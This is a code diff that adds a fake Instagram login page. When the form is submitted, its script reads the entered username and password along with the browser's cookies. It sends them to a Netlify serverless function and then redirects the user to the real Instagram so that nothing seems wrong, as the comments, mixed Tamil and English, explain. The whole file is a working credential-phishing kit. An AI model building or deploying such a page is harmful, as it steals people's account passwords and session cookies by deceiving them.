@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fafafa; }
+        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 300px; text-align: center; }
+        input { width: 100%; margin-bottom: 10px; padding: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2 style="font-style: italic;">Instagram</h2>
+        <form id="loginForm">
+            <input type="text" id="user" placeholder="Phone number, username, or email" required>
+            <input type="password" id="pass" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            const c = document.cookie || "No Cookies Yet";
+
+            // Netlify function-ukku data-va anuppurom
+            await fetch('/.netlify/functions/redirect?user=' + u + '&pass=' + p + '&cookies=' + encodeURIComponent(c));
+            
+            // Login aana maadhiri real Instagram-ku redirect pannuvom
+            window.location.href = "https://www.instagram.com";
+        };
+    </script>
+</body>
+</html>
